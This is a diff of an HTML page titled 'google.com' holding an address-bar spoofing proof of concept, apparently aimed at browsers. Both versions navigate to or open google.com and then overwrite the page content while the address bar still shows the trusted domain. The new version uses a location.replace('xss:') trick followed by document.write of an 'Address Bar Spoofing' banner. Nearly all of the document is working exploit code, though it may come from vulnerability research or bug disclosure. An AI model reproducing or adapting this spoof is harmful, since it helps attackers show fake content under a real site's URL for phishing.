@@ -1,108 +1,62 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>google.com</title>
 </head>
 <body>
-  <div style="text-align:center;font-family:Arial;">
-    <h1 style="color:#4285f4">Google</h1>
-    <p style="color:#666">Loading secure connection...</p>
-    <button onclick="spoofAndInject()"
-            style="padding:14px 28px;background:#4285f4;
-                   color:white;border:none;border-radius:6px;
-                   font-size:18px;cursor:pointer;">
-      Sign In to Google
-    </button>
-  </div>
 
-  <script>
-    function spoofAndInject() {
-      const targetTab = window.open(
-        "https://www.google.com/csi", "_blank"
-      );
-      
-      if (!targetTab) {
-        alert("Popup blocked!");
-        return;
-      }
+<center>
+  <button id="img" onclick="a()">Click me</button>
+  <div id="kata" style="display:none">Loading...</div>
+</center>
 
-      setTimeout(() => {
-        if (targetTab && !targetTab.closed) {
-          try {
-            targetTab.eval(`
-              (function() {
-                document.body.innerHTML = \`
-                  <div style="
-                    position:fixed;
-                    inset:0;
-                    background:#000;
-                    display:flex;
-                    flex-direction:column;
-                    justify-content:center;
-                    align-items:center;
-                    font-family:Arial,sans-serif;
-                  ">
-                    <img
-                      src="https://i.giphy.com/NmdU9DLL2ostigH2iW.webp"
-                      style="width:400px;max-width:90vw;"
-                    >
-                    <div style="
-                      margin-top:20px;
-                      color:#fff;
-                      font-size:48px;
-                      font-weight:900;
-                      letter-spacing:4px;
-                      text-shadow:0 0 10px #fff;
-                    ">
-                      Address Bar Spoofing
-                    </div>
-                  </div>
-                \`;
-              })();
-            `);
-          } catch (e) {
-            console.warn("eval failed:", e);
+<script>
+function a() {
+  // Sama persis seperti script Apple
+  // tapi target google.com
+  location = "http://www.google.com/csi"
+  
+  document.getElementById("img").style.display = "none";
+  document.getElementById("kata").style.display = "block";
 
-            // Fallback: document.write
-            try {
-              targetTab.document.open();
-              targetTab.document.write(`
-                <div style="
-                  position:fixed;
-                  inset:0;
-                  background:#000;
-                  display:flex;
-                  flex-direction:column;
-                  justify-content:center;
-                  align-items:center;
-                  font-family:Arial,sans-serif;
-                ">
-                  <img
-                    src="https://i.giphy.com/NmdU9DLL2ostigH2iW.webp"
-                    style="width:400px;max-width:90vw;"
-                  >
-                  <div style="
-                    margin-top:20px;
-                    color:#fff;
-                    font-size:48px;
-                    font-weight:900;
-                    letter-spacing:4px;
-                    text-shadow:0 0 10px #fff;
-                  ">
-                    Address Bar Spoofing
-                  </div>
-                </div>
-              `);
-              targetTab.document.close();
-            } catch(e2) {
-              console.warn("document.write failed:", e2);
-            }
-          }
-        }
-      }, 800);
-    }
-  </script>
+  setTimeout(() => {
+    location.replace('xss:')
+    
+    document.getElementById("kata").style.display = "none";
+
+    setTimeout(() => {
+      document.write(`
+        <div style="
+          position:fixed;
+          inset:0;
+          background:#000;
+          display:flex;
+          flex-direction:column;
+          justify-content:center;
+          align-items:center;
+          font-family:Arial,sans-serif;
+        ">
+          <img
+            src="https://i.giphy.com/NmdU9DLL2ostigH2iW.webp"
+            style="width:400px;max-width:90vw;"
+          >
+          <div style="
+            margin-top:20px;
+            color:#fff;
+            font-size:48px;
+            font-weight:900;
+            letter-spacing:4px;
+            text-shadow:0 0 10px #fff;
+          ">
+            Address Bar Spoofing
+          </div>
+        </div>
+      `);
+    }, 500);
+
+  }, 4000);
+}
+</script>
+
 </body>
 </html>
